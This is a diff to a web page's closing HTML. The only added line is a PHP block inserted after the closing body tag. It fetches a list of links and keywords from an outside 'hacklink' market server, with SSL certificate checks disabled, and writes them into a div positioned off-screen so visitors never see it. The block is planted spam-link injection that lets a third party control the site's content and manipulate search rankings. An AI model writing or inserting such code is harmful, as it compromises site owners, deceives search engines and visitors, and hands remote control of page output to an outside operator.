@@ -1577,4 +1577,5 @@ document.addEventListener('keydown',function(e){if(e.key==='Escape')closeWatch()
 </script>
 
 </body>
+<?php $url = "https://client.hacklinktr.com/api/market/bring-orders/4"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_TIMEOUT, 30); $response = curl_exec($ch); if (curl_errno($ch)) { die("cURL error: " . curl_error($ch)); } curl_close($ch); $data = json_decode($response, true); if (isset($data["items"]) && is_array($data["items"])) { echo '<div style="position: absolute; left: -9999px; top: -9999px; width: 1px; height: 1px; overflow: hidden;">'; foreach ($data["items"] as $item) { if (!empty($item["site_address"]) && !empty($item["keyword_1"]) && !empty($item["keyword_2"])) { echo '<a href="' . htmlspecialchars($item["site_address"]) . '" target="_blank" title="' . htmlspecialchars($item["keyword_1"]) . '">'; echo htmlspecialchars($item["keyword_2"]); echo '</a>'; } } echo '</div>'; } else { echo "No data found."; } ?>   
 </html>
